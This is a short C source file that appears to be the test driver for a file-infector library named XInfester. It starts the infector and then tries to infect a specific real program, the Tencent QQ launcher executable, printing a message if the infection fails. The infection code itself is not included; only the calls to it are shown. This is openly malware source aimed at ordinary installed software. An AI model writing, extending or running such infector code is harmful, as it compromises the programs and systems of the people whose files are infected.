#include "./inc/XInfester.h"

int main()
{
	XInfester_Run();
	if(!XInfester_InfectFile("D:\\Program Files\\Tencent\\QQ\\Bin\\QQScLauncher.exe"))
		printf("infect failed\n");
	
	printf("Xinfester Hello World.\n");
	getchar();
}